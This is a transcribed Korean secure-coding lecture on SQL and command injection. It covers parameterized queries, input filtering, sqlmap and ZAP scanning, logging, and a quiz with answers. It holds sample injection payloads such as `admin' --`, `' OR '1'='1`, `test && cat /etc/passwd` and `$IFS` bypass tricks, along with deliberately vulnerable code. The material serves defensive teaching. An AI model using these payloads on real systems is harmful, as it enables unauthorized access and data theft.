슬라이드 구성: 자물쇠 아이콘 + 'Statement 방식 DB Query' 제목, 빨간 리본 라벨 '안전하지 않은 코드' 아래 회색 코드 상자(변수 `userid`, `password`가 **빨간색** 강조), 파란 리본 라벨 '안전한 코드' 아래 회색 코드 상자, 맨 아래 설명 문장. (이 페이지의 삽입 이미지는 자물쇠 아이콘·리본 라벨 배경·제목/상자 그림자뿐이며 별도 글자 없음)

(※ 검증: Python(sqlite3)으로 확인 — 일치)
- 정상: `SELECT * FROM users WHERE userid ='kim'AND password='pw2'` → 1행 (`'`와 `AND` 사이 공백이 없어도 SQL 파싱은 정상)
- userid=`admin' --` → `SELECT * FROM users WHERE userid ='admin' --'AND password='x'` → 비밀번호 검사 없이 admin 행 반환
- 같은 값을 PreparedStatement `?`에 바인딩 → 0행
(※ 원문 표기 그대로 — `“AND password='"`, `password=?”;`에 둥근 따옴표 “ ”가 섞여 있어 그대로는 컴파일되지 않음. 또 `"'"` 다음 `"AND`에 공백이 없음)

---

## [2-SLIDES] 6주차 2차시 p.23 · SQL인젝션 취약점 대응 방법 – 시큐어코딩 적용
SQL인젝션 취약점 대응 방법 – 시큐어코딩 적용
Hibernate Query Language 방식
안전하지 않은 코드
List results = session.createQuery(
"from Orders as orders where orders.id = " + currentOrder.getId()).list();
안전한 코드
Query hqlQuery = session.createQuery("from Orders as orders where orders.id = ?0");
List results = hqlQuery.setString(0, "123-456-7890").list();

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
슬라이드 구성: 자물쇠 아이콘 + 'Hibernate Query Language 방식', 빨간 리본 '안전하지 않은 코드' / 파란 리본 '안전한 코드' 아래 회색 코드 상자. 안전하지 않은 코드에서 `orders.id = " + currentOrder.getId()).list();` 부분이 **빨간색** 강조. (삽입 이미지는 아이콘·리본·그림자뿐, 별도 글자 없음)

참고: `?0`은 JPA 스타일 위치(ordinal) 파라미터로 `setString(0, ...)`이 0번 자리에 값을 바인딩함(Hibernate 5.3+는 기존 `?` 레거시 파라미터 대신 `?0`, `?1` 형태 사용). `setString`은 Hibernate 5.2부터 deprecated, 6에서 제거되어 현재는 `setParameter(0, ...)` 사용. "123-456-7890"은 예시 값. (도구/라이브러리 지식 기반 — Python 검증 대상 아님)

---

## [2-SLIDES] 6주차 2차시 p.24 · SQL인젝션 취약점 대응 방법 – 시큐어코딩 적용
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 6주차 2차시 p.24 · 🔒 MyBatis 방식

**[안전하지 않은 코드]** (빨간 리본 라벨)
```xml
<select id="getPerson" parameterType=“String" resultType="org.application.vo.Person">
        SELECT * FROM PERSON WHERE NAME LIKE '${name}'
</select>
```

**[안전한 코드]** (파란 리본 라벨)
```xml
<select id="getPerson" parameterType=“String" resultType="org.application.vo.Person">
        SELECT * FROM PERSON WHERE NAME = #{name}
</select>
```

(※ 숨은 텍스트 — PDF 추출 텍스트에는 "Hibernate Query Language에 외부 입력값을 바인드 방식으로 처리하여 쿼리문이 변조 되지 않도록 한다." 문장이 안전한 코드 상자 위치에 들어 있으나, 회색 코드 상자에 가려 슬라이드 화면에는 보이지 않음. MyBatis 페이지인데 'Hibernate Query Language'로 적혀 있어 앞 슬라이드에서 복사된 잔재로 보임)
(※ 원문 표기 그대로 — `parameterType=“String"`의 여는 따옴표가 둥근 따옴표)

설명: `${name}`은 값을 SQL 문자열에 그대로 치환(문자열 결합)하고, `#{name}`은 PreparedStatement의 `?` 바인딩으로 처리됨.
(※ 검증: Python(sqlite3)으로 확인 — 일치) name에 `' OR '1'='1` 입력 시 `${}` 치환 결과 `SELECT * FROM PERSON WHERE NAME LIKE '' OR '1'='1'` → 전체 행 반환, `#{}`(바인딩) 방식은 0행.
(참고: 안전한 코드는 `LIKE`를 `=`로 바꿨으므로 부분 검색이 필요하면 MySQL 기준 `NAME LIKE CONCAT('%', #{name}, '%')`처럼 바인딩을 유지해야 함)

---

## [2-SLIDES] 6주차 2차시 p.25 · SQL인젝션 취약점 대응 방법 – 시큐어코딩 적용
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 6주차 2차시 p.25 · 🔒 Java Persistence API 방식

**[안전하지 않은 코드]** (빨간 리본 라벨)
```java
List results = entityManager.createQuery
   ("Select order from Orders order where order.id = " + orderId).getResultList();
```

**[안전한 코드]** (파란 리본 라벨)
```java
Query jpqlQuery =
    entityManager.createQuery("Select order from Orders order where order.id= ?1");
List results = jpqlQuery.setParameter(1, "123-456-7890").getResultList();
```

(※ 숨은 텍스트 — PDF 추출 텍스트에는 "Hibernate Query Language에 외부 입력값을 바인드 방식으로 처리하여 쿼리문이 변조 되지 않도록 한다." 문장이 안전한 코드 상자 안(두 코드 줄 사이 위치)에 들어 있으나, 회색 코드 상자에 가려 슬라이드 화면에는 보이지 않음. JPA 페이지인데 'Hibernate Query Language'로 적혀 있어 p.23에서 복사된 잔재로 보임)

설명: `?1`은 JPQL 위치 파라미터, `setParameter(1, ...)`로 1번 자리에 값을 바인딩 → orderId 문자열 결합 대신 바인딩으로 쿼리 구조 변조 방지. (JPA 문법 지식 기반 — Python 검증 대상 아님)

---

## [2-SLIDES] 6주차 2차시 p.26 · SQL인젝션 취약점 대응 방법 – 시큐어코딩 적용
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

### [2-SLIDES] 6주차 2차시 p.26 · 🔒 입력 값 필터링으로 안전한 값을 쿼리문에 사용

동적 쿼리 구조를 사용하여야 하는 경우, 외부 입력 값에 대해 철저한 필터링을 수행한 뒤 쿼리문에 사용하도록 한다.

**전달되는 파라미터에 필터링 되어야 하는 특수 문자들** (좌우 2개 표)

| 일반 | URL Encoding | HTML Encoding |
|---|---|---|
| `'` | `%27` | `&#x27;` `&apos;` |
| `"` | `%22` | `&#x22;` `&quot;` |
| `:` | `%3a` | `&#x3a;` |
| `;` | `%3b` | `&#x3b;` |
| `(` | `%28` | `&#x28;` |
| `)` | `%29` | `&#x29;` |
| `<` | `%3c` | `&#x3c;` `&lt;` |
| `>` | `%3e` | `&#x3e;` `&gt;` |
| `[` | `%5b` | `&#x5b;` |
| `]` | `%5d` | `&#x5d;` |
| `{` | `%7b` | `&#x7b;` |
| `}` | `%7d` | `&#x7d;` |

| 일반 | URL Encoding | HTML Encoding |
|---|---|---|
| `` ` `` | `%60` | `&#x60;` |
| `=` | `%3d` | `&#x3d;` |
| `#` | `%23` | `&#x23;` |
| `$` | `%24` | `&#x24;` |
| `%` | `%25` | `&#x25;` |
| `&` | `%26` | `&#x26;` `&amp;` |
| `?` | `%3f` | `&#x3f;` |
| `!` | `%21` | `&#x21;` |
| `@` | `%40` | `&#x40;` |
| `*` | `%2a` | `&#x2a;` |
| 탭문자 | `%09` | `&#x09;` |
| `\|` | `%7c` | `&#x7c;` |

(※ 검증: Python으로 확인 — 일치) 24개 문자 모두 URL 인코딩 `%XX` = 문자 코드(16진수), HTML 16진 엔티티 `&#xXX;`와 명명 엔티티(`&apos;`, `&quot;`, `&lt;`, `&gt;`, `&amp;`)가 `html.unescape`로 원래 문자로 복원됨.

---

## [2-SLIDES] 6주차 2차시 p.27 · SQL인젝션 취약점 대응 방법 – 입력 값 검증
SQL인젝션 취약점 대응 방법 – 입력 값 검증
SQLMap을 활용한 검증 테스트
자동화된 SQL인젝션 테스트 도구 SQLMap을 활용하여, 구현된 입력값 검증이 제대로 작동하는지 테스트
검증 테스트 예시
sqlmap -u "http://example.com/search?keyword=test" --risk=3 --level=5 --batch
- u: 타겟 URL 지정 (GET 파라미터 포함)
- -batch: 모든 질문에 자동으로 기본값 사용
- -risk [1-3]: 위험 수준 설정 (높을수록 다양한 페이로드 시도)
- -level [1-5]: 테스트 강도 조정 (높을수록 검사하는 파라미터와 페이로드가 많아짐)
- -dump: 데이터베이스 내용을 덤프 (테스트 목적 시에만 사용, 운영 환경에서는 주의해야 함)
테스트 결과 판단
- "Parameter: keyword (GET) appears to be 'safe’” 출력 시 성공적으로 방어되었음
- SQL인젝션 관련 취약점 경고가 출력되면, 입력 값 검증 로직을 보완해야 함

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[이미지] 오른쪽 하단: sqlmap 로고 — 검은 배경에 노란색 ASCII 아트 'sqlmap' 글자, 가운데 빨간 세로 막대(주사기 모양)와 `H`, `[,]`, `[']`, `[)]`, `V...` 기호. 명령 예시는 테두리 상자 안 고정폭 글꼴.

참고(도구 지식 기반, Python 검증 대상 아님): 명령의 `--risk=3 --level=5`는 설명의 `--risk [1-3]`, `--level [1-5]`와 같은 옵션(`=`/공백 모두 허용)이며 최댓값 조합이라 가장 많은 페이로드를 시도(시간이 오래 걸리고, risk 3은 OR 기반 페이로드로 데이터 변경 위험이 있음). `--dump`는 예시 명령에는 포함되지 않음.
(※ 원문 표기 그대로 — 결과 문구 끝 따옴표가 `'safe’”`로 혼용)
(참고: sqlmap은 주입 불가 시 보통 "all tested parameters do not appear to be injectable" 형태로 출력하고, "Parameter: keyword (GET)" 머리글은 주입 가능 지점을 찾았을 때 표시됨 — 슬라이드 문구는 실제 출력 문구와 다를 수 있음)

---

## [2-SLIDES] 6주차 2차시 p.28 · SQL인젝션 취약점 대응 방법 – 보안 로그 기록 및 모니터링
SQL인젝션 취약점 대응 방법 – 보안 로그 기록 및 모니터링
로그 기록 및 모니터링의 필요성
조기 탐지
- SQL 인젝션 공격은 종종 비정상적인 쿼리 패턴이나 오류 로그를 남김
- 실시간 모니터링을 통해 공격 징후를 빠르게 파악 가능
사후 분석
- 공격 발생 시 로그를 통해 원인 분석 및 대응 전략 수립
- 법적 대응 및 보안 감사 자료로 활용 쿼리 파라미터: 숫자, 날짜, 식별자 등 쿼리에서 사용되는 모든 값
로그 기록 대상
- 웹 애플리케이션 요청 로그 (입력 값, URL, IP 등)
- 데이터베이스 에러 로그 (SQL 문법 오류, 타입 변환 오류 등)
- 인증/인가 관련 이벤트 (로그인 실패, 권한 상승 시도 등)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
(※ 원문 표기 그대로 — '사후 분석'의 두 번째 항목 "법적 대응 및 보안 감사 자료로 활용" 뒤에 "쿼리 파라미터: 숫자, 날짜, 식별자 등 쿼리에서 사용되는 모든 값"이 같은 줄에 붙어 있음. 문맥상 다른 슬라이드에서 남은 문구로 보임)

---

## [2-SLIDES] 6주차 2차시 p.29 · SQL인젝션 취약점 대응 방법 – 보안 로그 기록 및 모니터링
SQL인젝션 취약점 대응 방법 – 보안 로그 기록 및 모니터링
로그 기록시 고려사항
- 쿼리 파라미터 및 입력값
사용자 입력값, 특히 특수문자나 SQL 예약어 포함 여부 기록
- 에러 및 예외 처리 로그
SQL 실행 오류, 구문 오류, 타입 변환 오류 등 상세 에러 메시지 기록
- 사용자 및 요청 정보
요청한 IP, timestamp, User Agent 등 공격 추적에 유용한 정보 기록
민감 정보(예: 비밀번호, 개인정보)는 로그에 기록하지 않도록 주의
모니터링 도구 및 기술
- SIEM(보안정보 및 이벤트 관리) 시스템
Splunk, ELK Stack (Elasticsearch, Logstash, Kibana), Graylog 등을 활용하여 로그 집계 및 실시간 분석
- 알림 및 자동 대응
- 특정 패턴(예: SQL 구문 오류, 이상한 파라미터 값) 감지 시 관리자에게 알림 발송
- 일정 기준 초과 시 자동으로 방어 조치(예: IP 차단) 수행

---

## [2-SLIDES] 6주차 2차시 p.30 · 요약 정리
요약 정리
- SQL 인젝션은 입력 값을 제대로 검증하지 않아 DB 쿼리가 조작될 수 있는 취약점입니다.
- 공격 방식에는 에러 메시지를 활용하는 Error-based, 여러 쿼리를 결합하는 Union-based, 응답을
통해 간접적으로 추론하는 Blind 방식 등이 있습니다.
- 이 취약점은 대규모 개인정보 유출이나 시스템 명령어 실행 등 심각한 보안 사고로 이어질 수 있습니다.
- PreparedStatement 같은 안전한 쿼리 작성, 입력 값 검증, 자동화 진단 도구 활용, 로깅·모니터링을
통해 대응하여야 합니다.
- 코드 리뷰와 사고 사례 학습을 통해 지속적으로 취약점을 점검하고, CI/CD 파이프라인에서 보안 검증
을 강화해야 합니다.

---

## [2-SLIDES] 6주차 2차시 p.31 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 6주차 2차시 p.32 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 6주차 2차시 p.33 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

(좌상단 'Quiz' 돋보기 아이콘)

**1. 다음 중 SQL 인젝션을 예방하기 위한 방법으로 옳지 않은 것은 무엇일까요?**
- 1) PreparedStatement(또는 파라미터 바인딩)를 사용한다.
- 2) 사용자 입력값을 길이·형식·특수문자 등에 대해 검증한다.
- 3) 개발자가 만든 쿼리를 문자열 결합으로 직접 작성한다.
- 4) 데이터베이스 에러 메시지를 사용자에게 그대로 노출하지 않는다.

**2. 다음 중 SQL 인젝션 공격으로 인해 발생할 수 있는 피해가 아닌 것은 무엇일까요?**
- 1) 데이터베이스에서 민감 정보가 유출된다.
- 2) 관리자 계정으로 인증을 우회할 수 있다.
- 3) 서버의 파일이 삭제되거나 변경될 수 있다.
- 4) 네트워크 장비가 물리적으로 파손된다.

**3. SQL 인젝션 방어를 위해 Java에서 동적 SQL 대신 권장되는 JDBC API 클래스 이름은?**

(                    )

---

## [2-SLIDES] 6주차 2차시 p.34 · 퀴즈 정답
퀴즈 정답
1. 다음 중 SQL 인젝션을 예방하기 위한 방법으로 옳지 않은 것은 무엇일까요?
3) 개발자가 만든 쿼리를 문자열 결합으로 직접 작성한다.
문자열 결합을 통해 쿼리를 직접 작성하면 인젝션 위험이 커집니다.
2. 다음 중 SQL 인젝션 공격으로 인해 발생할 수 있는 피해가 아닌 것은 무엇일까요?
4) 네트워크 장비가 물리적으로 파손된다.
SQL 인젝션은 주로 DB 및 서버 내부 데이터 조작에 영향을 미치며, 물리적 장비 파손은 직접적인 영향 범위가 아닙니다.
3. SQL 인젝션 방어를 위해 Java에서 동적 SQL 대신 권장되는 JDBC API 클래스 이름은?
( PreparedStatement )

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
슬라이드 표시: 정답 줄('3) 개발자가 만든 쿼리를 문자열 결합으로 직접 작성한다.', '4) 네트워크 장비가 물리적으로 파손된다.', 'PreparedStatement')은 **빨간색**, 해설은 검은색. 좌상단 'Quiz' 돋보기 아이콘.

# [2-SLIDES] 6주차 3차시 — ORM·MyBatis / SQL 인젝션 / Command 인젝션
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · Command Injection/커맨드 인젝션/명령어 삽입/명령 삽입/OS Command/CWE-78 · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · 화이트리스트/Whitelist/최소 허용/허용 목록 · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · ZAP/OWASP ZAP/Active Scan/Burp/버프스위트/버프 스위트 · 코드 리뷰/Code Review/SAST/DAST/정적 분석/동적 분석/SonarQube/Fortify

## [2-SLIDES] 6주차 3차시 p.1 · Command 인젝션 취약점 진단 및 대응
Command 인젝션 취약점 진단 및 대응
01 Command 인젝션 개념과 발생 원리
02 Command 인젝션 취약점 진단 및 대응

---

## [2-SLIDES] 6주차 3차시 p.2 · 학습 목표
학습 목표
Command 인젝션 취약점의 개념과 발생 원리를 이해한다.
실제 공격 기법을 학습하고, 취약점을 진단하는 방법을 익힌다.
시큐어코딩 및 시스템 보호 기법으로 Command 인젝션을 방어할 수 있다.

---

## [2-SLIDES] 6주차 3차시 p.3 · 학습 내용
학습 내용
1. Command 인젝션 개념 및 발생원리
2. Command 인젝션 취약점 진단 및 대응

---

## [2-SLIDES] 6주차 3차시 p.4 · Command 인젝션 취약점 진단 및 대응
Command 인젝션 취약점 진단 및 대응
01 Command 인젝션 개념 및 발생 원리
02 Command 인젝션 취약점 진단 및 대응

---

## [2-SLIDES] 6주차 3차시 p.5 · Command 인젝션이란?
Command 인젝션이란?
개요
적절한 검증 절차를 거치지 않은 사용자 입력 값이 명령어의
일부 또는 전부로 구성되어 실행되는 경우 의도하지 않은
시스템 명령어가 실행되어 부적절하게 권한이 변경되거나
시스템 동작에 악영향을 미친다.
발생원인
운영체제 명령을 실행하는 함수를 사용하는 경우, 검증되지
않은 사용자 입력 값이 명령이나 명령의 파라미터로
사용되는 경우에 발생한다.

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[이미지] 오른쪽 흑백 일러스트: 복면(눈가리개 마스크)과 후드를 쓴 해커가 웃으며 주사기를 들고 컴퓨터 본체 쪽으로 손을 뻗고 있음. 옆 모니터 화면에 큰 글씨로 "COMMAND INJECTION"이라고 표시됨 → '명령어를 주입(injection)한다'는 개념을 주사기로 비유한 그림.

---

## [2-SLIDES] 6주차 3차시 p.6 · Command 인젝션이란?
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

[도식] 공격자 → 웹 서버 → 명령어 창(cmd.exe)으로 이어지는 Command 인젝션 공격 흐름. 각 단계에 말풍선(생각 구름) 설명이 붙어 있음.

**등장 요소 (왼쪽 → 오른쪽)**
- **공격자** (선글라스 낀 사람 + 노트북 아이콘)
- **웹 서버** (서버 아이콘)
- **명령어 창** (검은 콘솔 박스, 안의 내용):
  ```
  cmd.exe
  type "filename"
  & ping 127.0.0.1
  ```

**화살표 흐름**
1. ① 조작된 Request — 공격자 → 웹 서버 (오른쪽 방향 화살표)
2. ② 조작된 명령문 실행 — 웹 서버 → 명령어 창 (오른쪽 방향 화살표)
3. ③ 공격 결과 — 웹 서버 → 공격자 (왼쪽 방향 되돌아오는 화살표)

**말풍선(생각 구름) 내용**
- (공격자 아래, 파란 점선 구름 — 사전 정찰 단계) "입력 값을 서버 내부에서 쉘(cmd.exe)을 실행할 때 argument 로 사용하는 기능을 찾는다."
- (① 화살표 위, 빨간 점선 구름 — 공격자의 조작) "filename & ping 127.0.0.1 로 파일명을 조작한다."
- (웹 서버 위, 빨간 점선 구름 — 서버의 원래 동작) "파일명(filename)을 입력하면, cmd.exe 명령을 실행하여 type 명령을 이용하여 파일 내용을 화면에 출력한다."
- (명령어 창 위, 빨간 점선 구름) "조작된 명령문 실행"

**정리**: 서버는 원래 `cmd.exe` 로 `type "파일명"` 을 실행해 파일 내용을 보여주는 기능이다. 공격자가 파일명 자리에 `filename & ping 127.0.0.1` 을 넣으면 cmd.exe 가 `&` 를 명령 구분자로 해석하여 `type "filename"` 다음에 `ping 127.0.0.1` 을 추가로 실행하고, 그 결과가 응답으로 공격자에게 돌아온다.

(※ 검증: 이 PC의 cmd.exe에서 `type "nofile.txt" & echo SECOND_CMD_RAN` 실행 — 첫 명령이 '파일을 찾을 수 없음' 오류로 실패해도 `&` 뒤 명령이 실행됨을 확인 — 일치. `&` 는 앞 명령의 성공 여부와 무관하게 다음 명령을 실행하는 연결자임.)

---

## [2-SLIDES] 6주차 3차시 p.7 · 운영체제별 명령어 실행 방식 이해 - Windows
운영체제별 명령어 실행 방식 이해 - Windows
기본 명령어 인터프리터
주로 cmd.exe와 최근에는 PowerShell 사용
내부 명령어와 외부 프로그램 호출 방식 구분
명령어 파싱 및 실행 과정
특수문자(예: &, |, >)를 이용한 명령어 연결 및 리다이렉션
보안 고려사항
명령어 인젝션 시, cmd.exe의 특수문자 해석을 악용 가능
PowerShell의 스크립트 실행 정책 및 명령어 확장 취약점 존재

---

## [2-SLIDES] 6주차 3차시 p.8 · 운영체제별 명령어 실행 방식 이해 - Linux
운영체제별 명령어 실행 방식 이해 - Linux
기본 명령어 인터프리터
기본적으로 /bin/sh(대부분 Bash 기반) 사용
쉘의 확장 기능(파이프, 리다이렉션, 와일드카드 등) 활용
명령어 파싱 및 실행 과정
공백, 따옴표, 이스케이프 문자() 처리 방식
환경 변수, 명령어 치환(`, $() 등)의 해석 과정 포함
보안 고려사항
쉘 메타문자 및 파이프, 명령어 치환의 잘못된 처리로 인젝션 위험 증가
환경 변수 조작 및 경로 변조 공격 가능성

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[이미지] 오른쪽에 Linux 마스코트 펭귄(Tux) 그림.
(※ 원문 표기 그대로 — "이스케이프 문자()" 의 괄호 안이 비어 있음. 슬라이드 이미지에서도 빈 괄호로 렌더링됨. 문맥상 이스케이프 문자인 백슬래시 `\` 가 누락된 것으로 보임: "이스케이프 문자(\)")

---

## [2-SLIDES] 6주차 3차시 p.9 · Command 인젝션 취약점 진단 및 대응
Command 인젝션 취약점 진단 및 대응
01 Command 인젝션 개념 및 발생 원리
02 Command 인젝션 취약점 진단 및 대응

---

## [2-SLIDES] 6주차 3차시 p.10 · Command 인젝션 취약점 진단 - 수동진단
Command 인젝션 취약점 진단 - 수동진단
수동 진단의 목표
사용자 입력이 시스템 명령어와 결합되어 실행되는 경우, 악의적인 조작이 가능한지 확인
의도치 않은 명령 실행이나 출력 조작을 통해 취약점을 탐지
기본 접근 방법
테스트 입력 값에 특수문자 및 제어 문자를 삽입하여 명령어의 실행 흐름 변화를 관찰
다양한 OS(Windows, Linux)와 쉘의 파싱 규칙을 고려하여 테스트 케이스 설계

---

## [2-SLIDES] 6주차 3차시 p.11 · Command 인젝션 취약점 진단 - 수동진단
Command 인젝션 취약점 진단 - 수동진단
명령어 연결자 테스트
&, &&, ||, ; 등으로 추가 명령어 실행 테스트
예) "test && cat /etc/passwd" 또는 "test; ls"
파이프 및 리다이렉션 테스트
|, >, < 등을 활용해 명령어 조작 테스트
예) "test | ls", "test > output.txt"

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
예시 페이로드 정리:
```bash
test && cat /etc/passwd   # 앞 명령 성공 시 /etc/passwd 출력
test; ls                  # 앞 명령 결과와 무관하게 ls 실행
test | ls                 # 파이프: 앞 출력이 ls 입력으로 전달, ls 결과 출력
test > output.txt         # 리다이렉션: 출력을 파일로 저장
```
(※ 검증: bash 에서 `echo test && echo CAT_RAN`, `echo test; ls`, `echo test | ls`, `echo test > output.txt` 를 실행해 각각 추가 명령 실행·파이프·파일 생성이 일어남을 확인 — 일치)

---

## [2-SLIDES] 6주차 3차시 p.12 · Command 인젝션 취약점 진단 - 수동진단
Command 인젝션 취약점 진단 - 수동진단
환경 변수 활용 테스트
환경 변수 활용
$PATH, $IFS 등을 이용하여 명령어 실행 환경 변경하거나, 검증 우회 시도
예) "test $PATH" 또는 "test$IFSls" 처럼 환경변수 활용 가능한지 테스트
서브 명령 실행 테스트
백틱 및 $() 사용
백틱 (`) 또는 $()`를 사용해 서브 명령어 실행되는지 테스트
예) "test `ls`" 또는 "test $(ls)"

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
예시 페이로드 정리:
```bash
test $PATH       # 환경변수 확장 여부 확인
test$IFSls       # $IFS(공백·탭·개행)로 공백 필터 우회 시도
test `ls`        # 백틱 명령 치환
test $(ls)       # $() 명령 치환
```
(※ 검증: bash 에서 `echo test$IFSls` 를 실행하면 `test` 만 출력됨 — 쉘이 `$IFSls` 를 하나의 변수명 `IFSls`(정의되지 않음 → 빈 문자열)로 해석하기 때문. `$IFS` 뒤에 바로 영문자가 오면 구분이 안 되므로, 의도대로 동작하려면 `test${IFS}ls` 처럼 중괄호로 변수명을 구분해야 함(이 경우 `test<공백/탭/개행>ls` 로 확장됨을 확인). `$IFS` 바로 뒤가 `/` 같은 비식별자 문자일 때(예: `cat$IFS/etc/passwd`)는 중괄호 없이도 동작.)
(※ 검증: `` echo test `ls` `` 와 `echo test $(ls)` 는 둘 다 `test a.txt b.txt` 처럼 ls 결과가 치환되어 출력됨 — 일치)
(※ 원문 표기 그대로 — "백틱 (`) 또는 $()`를 사용해" 에서 `$()` 뒤에 불필요한 백틱(`)이 하나 더 붙어 있음)

---

## [2-SLIDES] 6주차 3차시 p.13 · Command 인젝션 취약점 진단 – 자동화도구 활용
Command 인젝션 취약점 진단 – 자동화도구 활용
ZAP (Zed Attack Proxy) 설치 및 기본 설정
ZAP 공식 사이트(https://www.zaproxy.org/)에서 최신 버전 다운로드 및 설치
ZAP 실행 후, 프록시 포트(기본 8080) 확인
진단 환경 구성
진단 대상 웹 서비스 준비
브라우저 프록시 설정
브라우저의 프록시 설정을 ZAP의 프록시(예: localhost:8080)로 변경하여 모든 트래픽이 ZAP을 통해 흐르도록 설정

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[이미지] 오른쪽 위: ZAP 마스코트(방패 체크 표시 위에 번개 로고가 있는 로봇) 일러스트.
[도식] 하단 트래픽 흐름: [Browser] → (ZAP 번개 로고) → [Network Proxy] → [Web Application]
→ 브라우저의 모든 요청이 ZAP(프록시, 기본 localhost:8080)을 거쳐 네트워크/대상 웹 애플리케이션으로 전달되는 구조.

---

## [2-SLIDES] 6주차 3차시 p.14 · Command 인젝션 취약점 진단 – 자동화도구 활용
Command 인젝션 취약점 진단 – 자동화도구 활용
ZAP의 자동 검사 Active Scan 수행 방법
ZAP 좌측 트리에서 테스트 대상 URL 선택 후, 우 클릭
→ "Attack" → "Active Scan" 실행
스캔 결과 확인
스캔 결과 창에서 "Command Injection" 관련 알림
(예: 에러 메시지, 비정상 응답 코드 등) 확인
알림 상세 정보를 통해 의심되는 입력 필드 및 실행 결과
분석

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[화면 캡처 1] ZAP 메인 창 — 타이틀 "Untitled Session - ZAP 2.16.1", 모드 "Standard Mode". 메뉴바: 파일 / Edit / View / Analyse / 보고서 / Tools / Import / Export / Online / Help (한글·영문 혼합 UI).
- 좌측 Sites 트리: Contexts > Default Context, Sites > **http://localhost:…** (선택·강조) 하위에 `GET:/`, `board`, `css`, `img`, `GET:login`, `POST:login()(us…`, 그리고 `http://o.pki.goog…`.
- 대상 URL 우클릭 컨텍스트 메뉴: **공격**(=Attack, 강조) / Break... / Delete / Exclude from / Run application / 새 경고 / 이 노드에 대한 경고 / Include in Context / Include Site in Context / Exclude from Context / Flag as Context / Include Channel URL in Context / Exclude Channel URL from Context / Open/Resend with Request Editor... / Open in Requester Tab... (Ctrl+W) / Open URL in Browser / 시스템 브라우저에서 URL 열기 / Show in History Tab
- "공격" 하위 메뉴: **Active Scan...** / AJAX Spider... / Client Spider... / Spider... / Fuzz... / Forced Browse Site / Forced Browse Directory / Forced Browse Directory (and Children)
- 오른쪽 Welcome 탭: "Welcome to ZAP", "…ed penetration testing tool for finding vulnerabilities in web applications.", "…best to start with one of the options below.", 버튼 [Automated Scan] [Manual Explore], News 박스 "ZAP 2.16.1 is available now" [Learn More]. 상단 탭: …uest / Response / Requester.

[화면 캡처 2] "Active Scan" 대화상자 — 탭: Scope / 필터 / Input Vectors / Custom Vectors / Technology / **Policy**(선택).
- 왼쪽 Policy 트리: Client Browser / Information Gathering / **Injection**(선택) / Miscellaneous / Server Security
- 오른쪽 Injection 정책 목록 (Test Name / Threshold / Strength / Status — 모든 행 Default / Default / Release):
  Buffer Overflow, Cloud Metadata Potentially Exposed, CRLF Injection, Cross Site Scripting (Persistent), Cross Site Scripting (Persistent) - Prime, Cross Site Scripting (Persistent) - Spider, Cross Site Scripting (Reflected), Format String Error, Parameter Tampering, **Remote OS Command Injection**(선택·파란 강조), Server Side Code Injection, Server Side Include, Server Side Template Injection, Server Side Template Injection (Blind), Spring4Shell, SQL Injection, SQL Injection - Hypersonic SQL, SQL Injection - MsSQL, SQL Injection - MySQL
- 하단 버튼: [Start Scan] [초기화] [취소]
→ Command 인젝션 진단은 Active Scan 정책 중 Injection 카테고리의 "Remote OS Command Injection" 스캔 규칙이 담당함.
(※ 원문 표기 그대로 — 본문은 "Attack" → "Active Scan" 이라고 했지만, 캡처 속 ZAP은 한글 UI라 메뉴명이 "공격" 으로 표시됨)

---

## [2-SLIDES] 6주차 3차시 p.15 · Command 인젝션 대응 – 시큐어코딩 적용
Command 인젝션 대응 – 시큐어코딩 적용
명령어 삽입 취약점이 발생하는 경우
안전하지 않은 코드
...
String version = request.getParameter("version");
String cmd = new String("cmd.exe /K \"run.bat \"");
